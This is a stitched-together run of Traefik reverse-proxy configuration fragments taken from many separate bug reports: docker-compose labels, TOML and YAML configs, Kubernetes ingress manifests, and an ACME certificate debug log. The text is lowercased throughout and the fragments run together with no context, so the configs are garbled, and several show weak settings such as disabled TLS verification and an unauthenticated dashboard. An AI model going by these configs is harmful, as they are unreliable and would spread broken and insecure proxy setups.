services: traefik: image: traefik:2.2 container_name: traefik ports: - "80:80" - "443:443" volumes: - /var/run/docker.sock:/var/run/docker.sock - ./traefik.yml:/etc/traefik/traefik.yml:ro - ./custom/:/etc/traefik/custom/:ro - traefik_ssl:/letsencrypt networks: - traefik ghost: depends_on: - mysql - traefik container_name: ghost image: ghost:3 env_file: .ghost.env restart: always labels: - "traefik.enable=true" - "traefik.docker.network=traefik" - "traefik.http.routers.ghost.entrypoints=http, https" - "traefik.http.routers.ghost.rule=host(`xxxx`)" - "traefik.http.services.ghost.loadbalancer.server.port=2368" volumes: - www-data:/var/lib/ghost/content networks: - traefik - lan ```
traefik.toml
insecureskipverify = true
loglevel = "info"
defaultentrypoints = ["https","http"] [traefiklog] [accesslog] [accesslog.filters] [accesslog.fields] defaultmode = "keep"
[entrypoints] [entrypoints.ping] address = ":8090" [entrypoints.http] address = ":80" compress = true [entrypoints.http.proxyprotocol] trustedips = ["redacted"] [entrypoints.http.forwardedheaders] trustedips = ["redacted", "redacted"] [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] minversion = "versiontls11" [[entrypoints.https.tls.certificates]] certfile = "redacted.cer" keyfile = "redacted.key" [entrypoints.https.proxyprotocol] trustedips = ["redacted"] [entrypoints.https.forwardedheaders] trustedips = ["redacted", "redacted"] [ping]
entrypoint = "ping" [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "docker.localhost"
watch = true
swarmmode = true
``` service was deployed with docker-composer.yml, to docker datacenter using swarm mode orchestrator
these are the other labels used in docker-compose.yml - "traefik.frontend.whitelist.sourcerange=${traefik_whitelist:-redacted}" - "traefik.docker.network=is-2" - "traefik.port=8080" - "traefik.frontend.rule=host:${traefik_host}" - "traefik.frontend.passhostheader=true" - "traefik.backend.loadbalancer.stickiness=true" - "traefik.frontend.headers.sslredirect=true"
provider: kubernetes 1.16.6 ```yml
apiversion: v1
data: dynamic.toml: | [tls] [[tls.certificates]] certfile = "/certs/tls.crt" keyfile = "/certs/tls.key" stores = ["default"] traefik.toml: | [global] checknewversion = false sendanonymoususage = false [serverstransport] insecureskipverify = true [ping] [api] insecure = true dashboard = true [metrics] [metrics.prometheus] addentrypointslabels = true addserviceslabels = true [log] level = "debug" [accesslog] [entrypoints] [entrypoints.websecure] address = ":31443" [entrypoints.traefik] address = ":31666" [providers] [providers.file] filename = "/etc/traefik/dynamic.toml" [providers.kubernetescrd]
kind: configmap
``` we think we can add an opa rule to prevent this and also monitor logs, but it would be nice to enforce the yaml check for the crd :) thanks by advance for the help!
see links in above description
### if applicable, please paste the log...
time="2020-02-24t03:30:24z" level=info msg="configuration loaded from flags."
time="2020-02-24t03:30:33z" level=error msg="unable to obtain acme certificate for domains \\"my.domain.org\\": unable to generate a certificate for the domains [my.domain.org]: acme: error -> one or more domains had a problem:\ [my.domain.org] acme: error: 400 :: urn:ietf:params:acme:error:connection :: connection refused, url: \ " rule="host(`my.domain.org`) && pathprefix(`/`)" providername=myresolver.acme routername=route-name-asdf123zxy@kubernetescrd
time="2020-02-24t03:40:25z" level=warning msg="a new release has been found: 2.1.4
please consider updating." ``` ### work around..
- bring traefik online before my application
- delete and re-apply my ingressroute after traefik is online.
[http.middlewares.urlencodeforwardslash.replacepathregex] regex = "/entities/([^/]*)/([^/]*)/(.*)" replacement = "/entities/${1}/${2}%2f${3}"
**service definition:**
apiversion: v1
kind: service
metadata: name: android-service
spec: ports: #if i change this line below to 443, the externalname resolve https scheme correctly
but the ssl mechanism also still not works - port: 5000 protocol: tcp targetport: 5000 selector: service-name: android-service type: clusterip
``` **service with "externalname":**
apiversion: v1
kind: service
metadata: annotations: name: android-service-external
spec: externalname: android-service ports: - port: 5000 protocol: tcp targetport: 5000 type: externalname
``` **the ingressroute definition:**
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: android-service
spec: entrypoints: - websecure routes: - match: host(`grpc-endpoint.domain.com`) kind: rule services: - name: android-service-external #this port will causing the fallback to "http" scheme instead of "https" port: 5000 scheme: https tls: secretname: tls-grpc-android-frontend
```
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: force-https namespace: default
spec: redirectscheme: scheme: https permanent: false
apiversion: networking.k8s.io/v1beta1
kind: ingress
metadata: name: echo-http-notls namespace: default annotations: traefik.ingress.kubernetes.io/router.middlewares: "default-force-https@kubernetescrd" traefik.ingress.kubernetes.io/router.entrypoints: "web"
spec: rules: - host: "example.org" http: paths: - path: / backend: servicename: echo-http serviceport: 8080
apiversion: networking.k8s.io/v1beta1
kind: ingress
metadata: name: echo-http namespace: default annotations: traefik.ingress.kubernetes.io/router.entrypoints: "websecure" cert-manager.io/issuer: "acme-staging"
spec: tls: - hosts: - example.org secretname: test-ingress-crt rules: - host: "example.org" http: paths: - path: / backend: servicename: echo-http serviceport: 8080
http: routers: shared-vault-http: entrypoints: - web rule: "host(`vault.example.net`)" service: shared-vault middlewares: - redirect shared-vault-https: entrypoints: - websecure rule: "host(`vault.example.net`)" service: shared-vault tls: certresolver: cloudflare services: shared-vault: loadbalancer: healthcheck: path: /v1/sys/health port: 8200 scheme: https interval: "10s" timeout: "3s" servers: - url: - url: - url: middlewares: redirect: redirectscheme: scheme: https
```
**traefik.yml:**
api: dashboard: true log: level: debug entrypoints: http: address: ":80" https: address: ":443" providers: docker: endpoint: "unix:///var/run/docker.sock" exposedbydefault: false certificatesresolvers: leresolver: acme: email: me@mydomain.dev storage: acme.json httpchallenge: # used during the challenge entrypoint: http
``` **docker-compose.yml:**
version: \'3.7\' services: traefik: image: traefik:latest container_name: traefik restart: unless-stopped networks: - traefik ports: - 80:80 - 443:443 volumes: - /etc/localtime:/etc/localtime:ro - /var/run/docker.sock:/var/run/docker.sock:ro - ./traefik.yml:/traefik.yml:ro - ./acme.json:/acme.json labels: - "traefik.enable=true" # ping service - "traefik.http.routers.ping.rule=host(`mydomain.dev`)&&path(`/ping`)" - "traefik.http.routers.ping.service=ping@internal" - "traefik.http.routers.ping.tls.certresolver=leresolver" - "traefik.http.routers.ping.tls=true" # middleware redirect - "traefik.http.middlewares.redirect-to-https.redirectscheme.scheme=https" # global redirect to https - "traefik.http.routers.redirs.rule=hostregexp(`{host:.+}`)" - "traefik.http.routers.redirs.entrypoints=http" - "traefik.http.routers.redirs.middlewares=redirect-to-https" # traefik dashboard - "traefik.http.routers.traefik.entrypoints=https" - "traefik.http.routers.traefik.rule=host(`mydomain.dev`)&&pathprefix(`/traefik`)" - "traefik.http.routers.traefik.tls=true" - "traefik.http.routers.traefik.tls.certresolver=leresolver" - "traefik.http.routers.traefik.service=api@internal" # setup middlewares - "traefik.http.middlewares.simpleauth.basicauth.users=admin:<hashhh>" - "traefik.http.middlewares.traefik_fixprefix.stripprefix.prefixes=/traefik" # register middlewares - "traefik.http.routers.traefik.middlewares=traefik_fixprefix,simpleauth" networks: traefik: name: traefik
[log] level = "debug"
[entrypoints] [entrypoints.web] address = ":80" [api] dashboard = true debug = true [providers.file] filename = "/etc/traefik/traefik_dynamic.toml" debugloggeneratedtemplate = true
[http] [http.services] [http.services.giis_website.loadbalancer] [[http.services.giis_website.loadbalancer.servers]] url = " " [http.services.jhub.loadbalancer] passhostheader = true [http.services.jhub.loadbalancer.sticky.cookie] [[http.services.jhub.loadbalancer.servers]] url = " " [http.routers] [http.routers.website] entrypoints = ["web"] rule = "host(`backend.example.org`)" service="giis_website" [http.routers.traefik] entrypoints = ["web"] rule = "pathprefix(`/api`) || pathprefix(`/dashboard`)" service = "api@internal" middlewares = ["auth"] [http.routers.jhub] entrypoints = ["web"] rule = "host(`backend.example.org`) && pathprefix(`/jhub`)" service = "jhub" middlewares = ["testheader"] [http.routers.jhubws] entrypoints = ["web"] rule = "headersregexp(`sec-websocket-version`,`(.*)`) && pathprefix(`/jhub/{user/[^/]+}/{api/kernels/[^/]+/channels|terminals/websocket}/`)" service = "jhub" [http.middlewares] [http.middlewares.auth.basicauth] users = [ "master:___secret___" ] [http.middlewares.testheader.headers] [http.middlewares.testheader.headers.customrequestheaders] referer = "backend.example.org/jhub/hub" ```
traefik_static.yaml
entrypoints: web: address: ":80" web-secure: address: ":443" providers: file: directory: /etc/traefik filename: traefik_dynamic.yaml docker: endpoint: "unix:///var/run/docker.sock" swarmmode: true exposedbydefault: true network: "my-department" watch: true
log: level: "debug"
accesslog: {}
api: dashboard: true
ping: entrypoint: "web-secure" ``` traefik_dynamic.yaml
http: routers: api: entrypoints: - web-secure middlewares: - dashboard-trailing-slash - api-auth rule: "pathprefix(`/api`) || pathprefix(`/dashboard`)" service: "api@internal" priority: 500 tls: {} tls-redirect: entrypoints: - web middlewares: - tls-redirect service: dummy-service rule: hostregexp(`{any:.*}`) priority: 1000 services: dummy-service: loadbalancer: servers: - url: "" middlewares: sts: headers: stsseconds: 15768000 tls-redirect: redirectscheme: scheme: https api-auth: basicauth: usersfile: "/run/secrets/traefik_api_users" dashboard-trailing-slash: redirectregex: regex: \'^(.*)/dashboard$\' replacement: \'${1}/dashboard/\'
tls: stores: default: defaultcertificate: certfile: "/run/secrets/ssl_cert" keyfile: "/run/secrets/ssl_key" ``` nexus labels (from docker swarm stack file)
- "traefik.http.routers.nexus.rule=pathprefix(`/nexus`)" - "traefik.http.routers.nexus.tls" - "traefik.http.routers.nexus.middlewares=sts@file" - "traefik.http.services.nexus.loadbalancer.server.port=8081" - "traefik.docker.lbswarm=true" - "traefik.docker.network=stack_my-department"
[global] checknewversion = false sendanonymoususage = false #[api]
# insecure = false
# dashboard = false
# debug = false [metrics.prometheus] entrypoint = "web" buckets = [0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1.0,1.5,2.0] [log] level = "debug" [accesslog] format = "json" [entrypoints] [entrypoints.web] address = "127.0.0.1:8081" [providers.file] filename = "/users/s.rabot/go/src/github.com/containous/traefik/ratelimit.toml" ## dynamic configuration ## [http.routers] [http.routers.router1] service = "service1" middlewares = [ "ratelimit" ] rule = "path(`/`)" [http.middlewares] [http.middlewares.ratelimit.ratelimit] average = 1 burst = 2 [http.services] [http.services.service1] [http.services.service1.loadbalancer] passhostheader = true [[http.services.service1.loadbalancer.servers]] url = " "
```
entrypoints: http: address: :80 https: address: :443 providers: docker: endpoint: unix:///var/run/docker.sock exposedbydefault: false file: directory: /etc/traefik/dynamic/ certificatesresolvers: letsencrypt: acme: email: example@example.com storage: /etc/traefik/acme/acme.json dnschallenge: provider: cloudflare delaybeforecheck: 0 serverstransport: insecureskipverify: true api: dashboard: true
http: routers: dashboard: entrypoints: - https rule: host(`traefik.example.com`) service: api@internal tls: certresolver: letsencrypt domains: - main: example.com sans: - "*.example.com"
```
containers: - args: - --log=true - --log.level=info - --providers.kubernetesingress.ingressendpoint.ip=127.0.0.1 - --entrypoints.http.address=:80 - --entrypoints.https.address=:443 - --providers.kubernetesingress=true - --providers.kubernetescrd=false - --api=true - --api.dashboard=true - --api.insecure=true - --ping=true - --log.level=debug - --accesslog=true
``` ingress.yaml
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: field.cattle.io/publicendpoints: \'[{"addresses":["127.0.0.1"],"port":80,"protocol":"http","servicename":"default:demo-ssl-demo-ssl-wildcard","ingressname":"default:demo-ssl-demo-ssl-wildcard","hostname":"*.somedomain.tld","path":"/","allnodes":true}]\' kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/priority: "1" creationtimestamp: "2020-01-27t13:19:26z" generation: 3 labels: app.kubernetes.io/instance: demo-ssl app.kubernetes.io/managed-by: tiller app.kubernetes.io/name: demo-ssl-wildcard app.kubernetes.io/version: "1.0" helm.sh/chart: demo-ssl-wildcard-0.1.0 name: demo-ssl-demo-ssl-wildcard namespace: default resourceversion: "56777724" selflink: /apis/extensions/v1beta1/namespaces/default/ingresses/demo-ssl-demo-ssl-wildcard uid: 524e0a63-09cc-4886-a013-e387834680d0
spec: rules: - host: '*.somedomain.tld' http: paths: - backend: servicename: demo-ssl-demo-ssl-wildcard serviceport: 80 path: /
```
checknewversion = false
maxidleconnsperhost = 500
loglevel = "debug"
defaultentrypoints = ["http"] insecureskipverify = true [entrypoints] [entrypoints.http] address = ":80" [ping]
entrypoint = "http" [api]
entrypoint="http"
dashboard = true
debug = true [api.statistics] recenterrors = 10 [ecs]
clusters = ["my-ecs-cluster"]
watch = true
domain = "my.domain"
autodiscoverclusters = false
refreshseconds = 15
exposedbydefault = true
region = "ap-southeast-2"
<summary>traefik.yml</summary> ```yaml
api: insecure: true dashboard: true debug: true providers: docker: endpoint: "unix:///var/run/docker.sock" exposedbydefault: false network: traefik file: directory: /conf/ watch: true entrypoints: web: address: ":80" transport: web-secure: address: ":443" transport: certificatesresolvers: le: acme: email: <removed> storage: acme.json tlschallenge: {} serverstransport: insecureskipverify: true log: level: debug filepath: "/var/log/traefik.log"
``` </details> <details>
<summary>conf/middlewares.yml</summary> ```yaml
http: middlewares: https-redirect: redirectscheme: scheme: https default-headers: headers: framedeny: false customframeoptionsvalue: "" sslredirect: true # browserxssfilter: true contenttypenosniff: true forcestsheader: true stsincludesubdomains: true stspreload: true accesscontrolalloworigin: "*" customresponseheaders: x-frame-options: "" authelia: forwardauth: address: " #/" tls: insecureskipverify: true trustforwardheader: true web-default-chain: chain: middlewares: - https-redirect - default-headers - authelia - x-frame-block web-secure-default-chain: chain: middlewares: - default-headers - authelia - x-frame-block auth-default-chain: chain: middlwares: - default-headers - https-redirect x-frame-block: headers: customresponseheaders: x-frame-options: "" customrequestheaders: x-frame-options: ""
``` </details> <details>
<summary>traefik docker compose</summary> ```yaml
version: \'3\' services: traefik: container_name: traefik restart: always ports: - \'8080:8080\' - \'80:80\' - \'443:443\' volumes: - \'./files/traefik/traefik.yml:/etc/traefik/traefik.yml\' - \'./files/traefik/traefik_config_files/enabled/:/conf/\' - \'./files/traefik/ssl/:/ssl/\' - \'./files/traefik/acme.json:/acme.json\' - \'/var/run/docker.sock:/var/run/docker.sock\' - \'./files/traefik/traefik.log:/var/log/traefik.log\' image: "traefik:latest" command: - "--serverstransport.insecureskipverify=true" networks: traefik: networks: traefik: external: true
``` </details> <details>
<summary>authelia docker compose</summary> ```yaml
version: \'3\' services: authelia: image: clems4ever/authelia:master container_name: authelia restart: always volumes: - ./files/config.minimal.yml:/etc/authelia/configuration.yml:ro - ./files/users_database.yml:/etc/authelia/users_database.yml:rw - ./files/storage.db:/etc/authelia/storage.db:rw - /tmp/authelia:/tmp/authelia environment: - node_tls_reject_unauthorized=1 labels: - "traefik.enable=true" - "traefik.http.routers.auth-web.rule=host(`auth.<removed>.cloud`)" - "traefik.http.routers.auth-web.entrypoints=web" - "traefik.http.routers.auth-web.middlewares=web-default-chain@file" - "traefik.http.routers.auth-web-secure.rule=host(`auth.<removed>.cloud`)" - "traefik.http.routers.auth-web-secure.entrypoints=web-secure" - "traefik.http.routers.auth-web-secure.middlewares=auth-default-chain@file" - "traefik.http.routers.auth-web-secure.tls=true" - "traefik.http.routers.auth-web-secure.tls.certresolver=le" expose: - 8080 networks: - web - mail networks: web: external: name: traefik mail: external: true
``` </details> <details>
<summary>sample proxied container (httpbin) docker compose</summary> ```yaml
version: \'3\' services: httpbin: container_name: httpbin image: kennethreitz/httpbin restart: always expose: - 80 labels: - "traefik.enable=true" - "traefik.http.routers.httpbin-web.rule=host(`httpbin.<removed>.cloud`)" - "traefik.http.routers.httpbin-web.entrypoints=web" - "traefik.http.routers.httpbin-web.middlewares=web-default-chain@file" - "traefik.http.routers.httpbin-web-secure.rule=host(`httpbin.<removed>.cloud`)" - "traefik.http.routers.httpbin-web-secure.entrypoints=web-secure" - "traefik.http.routers.httpbin-web-secure.middlewares=web-secure-default-chain@file" - "traefik.http.routers.httpbin-web-secure.tls=true" - "traefik.http.routers.httpbin-web-secure.tls.certresolver=le" networks: - web networks: web: external: name: traefik
``` </details>
redis latest version (`v5.0.7`)
--providers.redis --providers.redis.endpoints=127.0.0.1:6379
version: "3" services: reverse-proxy: image: traefik:latest command: - --api.dashboard=true - --providers.docker - --log.level=debug - --entrypoints.web.address=:80 - --entrypoints.websecure.address=:443 - --entrypoints.mongodb.address=:27017 - --certificatesresolvers.httpchallenge.acme.httpchallenge=true - --certificatesresolvers.httpchallenge.acme.httpchallenge.entrypoint=web - --certificatesresolvers.httpchallenge.acme.caserver= - --certificatesresolvers.httpchallenge.acme.email=letsencrypt@xerocs.com - --certificatesresolvers.httpchallenge.acme.storage=/letsencrypt/acme.json ports: - "80:80" - "443:443" volumes: - ./letsencrypt:/letsencrypt - /var/run/docker.sock:/var/run/docker.sock labels: - "comicro.enable=true" - "traefik.http.routers.api.rule=host(`traefik.comicro.loc`)" - "traefik.http.routers.api.service=api@internal" - "traefik.http.routers.api.entrypoints=websecure" - "traefik.http.routers.api.tls=true" - "traefik.http.routers.api.tls.certresolver=httpchallenge" - "traefik.http.routers.api.middlewares=dashboardauth" - "traefik.http.middlewares.dashboardauth.basicauth.users=${traefik_admin_credentials}" whoami: image: containous/whoami labels: - "traefik.http.routers.whoami.rule=pathprefix(`/whoami`)" - "traefik.http.routers.whoami.entrypoints=websecure" - "traefik.http.routers.whoami.tls=true" - "traefik.http.routers.whoami.tls.certresolver=httpchallenge" - "traefik.http.routers.whoamihttp.rule=pathprefix(`/whoami`)" - "traefik.http.routers.whoamihttp.entrypoints=web" - "traefik.http.middlewares.redirect.redirectscheme.scheme=https" - "traefik.http.routers.whoamihttp.middlewares=redirect" mongo: image: mongo labels: - "traefik.tcp.routers.mongo.rule=hostsni(`mongodb.comicro.loc`)" - "traefik.tcp.routers.mongo.entrypoints=mongodb" - "traefik.tcp.routers.mongo.tls.passthrough=true" - "traefik.tcp.routers.mongo.service=mongo" - "traefik.tcp.services.mongo.loadbalancer.server.port=27017" ```
when playing with traefik started by this command: ```bash
docker pull traefik:2.1
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \\ traefik:2.1 \\ --providers.docker \\ --providers.docker.exposedbydefault=false \\ --entrypoints.http.address=:80 \\ --entrypoints.https.address=:443
``` i started this command:
docker run --rm \\ -l 'traefik.http.routers.test.rule=host(`test`)' \\ -l traefik.http.services.test \\ -l traefik.enable=true \\ containous/whoami
log: level: info
providers: docker: {}
entrypoints: web: address: ":80" transport: respondingtimeouts: readtimeout: "20s" writetimeout: "20s" idletimeout: 30 web-secur: address: ":443" transport: respondingtimeouts: readtimeout: "20s" writetimeout: "20s" idletimeout: 30
accesslog: {}
```
version: "3.6" services: traefik: image: traefik:2.1 command: > --entrypoints.https.address=:443 --providers.docker --providers.docker.network=webgateway --providers.docker.exposedbydefault=false --api --certificatesresolvers.test --certificatesresolvers.test.acme.dnschallenge --certificatesresolvers.test.acme.dnschallenge.provider=acme-dns --certificatesresolvers.test.acme.email=xxx@yyyy.zzzz --certificatesresolvers.test.acme.storage=/etc/traefik-certs/acme.json --certificatesresolvers.test.acme.keytype=rsa4096 --log --log.level=info --log.format=json restart: always ports: - "443:443" environment: acme_dns_api_base: acme_dns_storage_path: /etc/traefik-certs/acme-dns.json volumes: - /var/run/docker.sock:/var/run/docker.sock - ${cert_storage_path}:/etc/traefik-certs networks: webgateway: labels: traefik.enable: true traefik.http.routers.traefik.rule: host(`${base_domain}`) && ( pathprefix(`/api`) || pathprefix(`/dashboard`) ) traefik.http.routers.traefik.service: "api@internal" traefik.http.routers.traefik.tls.certresolver: test traefik.http.routers.traefik.tls.domains[0].main: ${base_domain} traefik.http.routers.traefik.tls.domains[0].sans: "*.${base_domain}" traefik.http.routers.traefik.entrypoints: https networks: webgateway: name: webgateway
``` additional information: using the acme.sh script on the same domain with same account configuration could obtain a valid certificate from let's encrypt
log output of current failure reproduction: ```
time="2020-01-08t14:41:38z" level=info msg="configuration loaded from flags."
{"level":"info","msg":"traefik version 2.1.2 built on 2020-01-07t18:23:57z","time":"2020-01-08t14:41:38z"}
{"level":"debug","msg":"static configuration loaded {\\"global\\":{\\"checknewversion\\":true},\\"serverstransport\\":{\\"maxidleconnsperhost\\":200},\\"entrypoints\\":{\\"https\\":{\\"address\\":\\":443\\",\\"transport\\":{\\"lifecycle\\":{\\"gracetimeout\\":10000000000},\\"respondingtimeouts\\":{\\"idletimeout\\":180000000000}},\\"forwardedheaders\\":{}}},\\"providers\\":{\\"providersthrottleduration\\":2000000000,\\"docker\\":{\\"watch\\":true,\\"endpoint\\":\\"unix:///var/run/docker.sock\\",\\"defaultrule\\":\\"host(`{{ normalize .name }}`)\\",\\"network\\":\\"webgateway\\",\\"swarmmoderefreshseconds\\":15000000000}},\\"api\\":{\\"dashboard\\":true},\\"log\\":{\\"level\\":\\"debug\\",\\"format\\":\\"json\\"},\\"certificatesresolvers\\":{\\"test\\":{\\"acme\\":{\\"email\\":\\"profil@data-experts.de\\",\\"caserver\\":\\" ",\\"storage\\":\\"/etc/traefik-certs/acme.json\\",\\"keytype\\":\\"rsa4096\\",\\"dnschallenge\\":{\\"provider\\":\\"acme-dns\\"}}}}}","time":"2020-01-08t14:41:38z"}
{"level":"info","msg":"\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: ","time":"2020-01-08t14:41:38z"}
{"level":"info","msg":"starting provider aggregator.provideraggregator {}","time":"2020-01-08t14:41:38z"}
{"entrypointname":"https","level":"debug","msg":"start tcp server","time":"2020-01-08t14:41:38z"}
{"level":"info","msg":"starting provider *docker.provider {\\"watch\\":true,\\"endpoint\\":\\"unix:///var/run/docker.sock\\",\\"defaultrule\\":\\"host(`{{ normalize .name }}`)\\",\\"network\\":\\"webgateway\\",\\"swarmmoderefreshseconds\\":15000000000}","time":"2020-01-08t14:41:38z"}
{"level":"info","msg":"starting provider *acme.provider {\\"email\\":\\"xxx@yyy.zzz\\",\\"caserver\\":\\" ",\\"storage\\":\\"/etc/traefik-certs/acme.json\\",\\"keytype\\":\\"rsa4096\\",\\"dnschallenge\\":{\\"provider\\":\\"acme-dns\\"},\\"resolvername\\":\\"test\\",\\"store\\":{},\\"challengestore\\":{}}","time":"2020-01-08t14:41:38z"}
{"level":"info","msg":"testing certificate renew...","providername":"test.acme","time":"2020-01-08t14:41:38z"}
{"level":"info","msg":"starting provider *traefik.provider {}","time":"2020-01-08t14:41:38z"}
{"level":"debug","msg":"configuration received from provider test.acme: {\\"http\\":{},\\"tls\\":{}}","providername":"test.acme","time":"2020-01-08t14:41:38z"}
{"level":"debug","msg":"configuration received from provider internal: {\\"http\\":{\\"services\\":{\\"api\\":{},\\"dashboard\\":{}}},\\"tcp\\":{},\\"tls\\":{}}","providername":"internal","time":"2020-01-08t14:41:38z"}
{"level":"debug","msg":"no default certificate, generating one","time":"2020-01-08t14:41:38z"}
{"level":"debug","msg":"provider connection established with docker 19.03.5 (api 1.40)","providername":"docker","time":"2020-01-08t14:41:38z"}
{"level":"debug","msg":"configuration received from provider docker: {\\"http\\":{},\\"tcp\\":{}}","providername":"docker","time":"2020-01-08t14:41:38z"}
{"level":"debug","msg":"provider event received {status:start id:d3e568d1c96241c01f623b7d8c244af6fa94356028046c232a4e863c819b5946 from:traefik:2.1 type:container action:start actor:{id:d3e568d1c96241c01f623b7d8c244af6fa94356028046c232a4e863c819b5946 attributes:map[com.docker.compose.config-hash:b79f73264b9211e72fd1038a91c12fba09cf0e5a42ae174eb2e1a7fbca2b965b com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:ceres com.docker.compose.project.config_files:docker-compose.yaml com.docker.compose.project.working_dir:/home/ceres com.docker.compose.service:traefik com.docker.compose.version:1.25.0 image:traefik:2.1 name:ceres_traefik_1 org.opencontainers.image.description:a modern reverse-proxy org.opencontainers.image.documentation: org.opencontainers.image.title:traefik org.opencontainers.image.url: org.opencontainers.image.vendor:containous org.opencontainers.image.version:v2.1.2 traefik.enable:true traefik.http.routers.traefik.entrypoints:https traefik.http.routers.traefik.rule:host(`staging.ceres.data-experts.net`) \\u0026\\u0026 ( pathprefix(`/api`) || pathprefix(`/dashboard`) ) traefik.http.routers.traefik.service:api@internal traefik.http.routers.traefik.tls.certresolver:test traefik.http.routers.traefik.tls.domains[0].main:staging.ceres.data-experts.net traefik.http.routers.traefik.tls.domains[0].sans:*.staging.ceres.data-experts.net]} scope:local time:1578494498 timenano:1578494498714568105}","providername":"docker","time":"2020-01-08t14:41:38z"}
{"level":"debug","msg":"configuration received from provider docker: {\\"http\\":{\\"routers\\":{\\"traefik\\":{\\"entrypoints\\":[\\"https\\"],\\"service\\":\\"api@internal\\",\\"rule\\":\\"host(`staging.ceres.data-experts.net`) \\\\u0026\\\\u0026 ( pathprefix(`/api`) || pathprefix(`/dashboard`) )\\",\\"tls\\":{\\"certresolver\\":\\"test\\",\\"domains\\":[{\\"main\\":\\"staging.ceres.data-experts.net\\",\\"sans\\":[\\"*.staging.ceres.data-experts.net\\"]}]}}},\\"services\\":{\\"traefik-ceres\\":{\\"loadbalancer\\":{\\"servers\\":[{\\"url\\":\\" "}],\\"passhostheader\\":true}}}},\\"tcp\\":{}}","providername":"docker","time":"2020-01-08t14:41:38z"}
{"level":"debug","msg":"no default certificate, generating one","time":"2020-01-08t14:41:38z"}
{"level":"debug","msg":"no default certificate, generating one","time":"2020-01-08t14:41:38z"}
{"entrypointname":"https","level":"debug","middlewarename":"tracing","middlewaretype":"tracingforwarder","msg":"added outgoing tracing middleware api@internal","routername":"traefik@docker","time":"2020-01-08t14:41:40z"}
{"entrypointname":"https","level":"debug","middlewarename":"traefik-internal-recovery","middlewaretype":"recovery","msg":"creating middleware","time":"2020-01-08t14:41:40z"}
{"level":"debug","msg":"no default certificate, generating one","time":"2020-01-08t14:41:40z"}
{"level":"debug","msg":"looking for provided certificate(s) to validate [\\"staging.ceres.data-experts.net\\" \\"*.staging.ceres.data-experts.net\\"]...","providername":"test.acme","time":"2020-01-08t14:41:41z"}
{"level":"debug","msg":"domains [\\"staging.ceres.data-experts.net\\" \\"*.staging.ceres.data-experts.net\\"] need acme certificates generation for domains \\"staging.ceres.data-experts.net,*.staging.ceres.data-experts.net\\".","providername":"test.acme","time":"2020-01-08t14:41:41z"}
{"level":"debug","msg":"loading acme certificates [staging.ceres.data-experts.net *.staging.ceres.data-experts.net]...","providername":"test.acme","time":"2020-01-08t14:41:41z"}
{"level":"debug","msg":"building acme client...","providername":"test.acme","time":"2020-01-08t14:41:41z"}
{"level":"debug","msg":" ","providername":"test.acme","time":"2020-01-08t14:41:41z"}
{"level":"debug","msg":"using dns challenge provider: acme-dns","providername":"test.acme","time":"2020-01-08t14:41:42z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net, *.staging.ceres.data-experts.net] acme: obtaining bundled san certificate","time":"2020-01-08t14:41:42z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] authurl: ","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] authurl: ","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: use dns-01 solver","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: could not find solver for: tls-alpn-01","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: could not find solver for: http-01","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: use dns-01 solver","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: preparing to solve dns-01","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: preparing to solve dns-01","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: trying to solve dns-01","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: checking dns record propagation using [127.0.0.11:53]","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] wait for propagation [timeout: 1m0s, interval: 2s]","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:41:43z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:41:45z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:41:47z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:41:49z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:41:51z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:41:53z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:41:55z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:41:57z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:41:59z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:01z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:03z"}
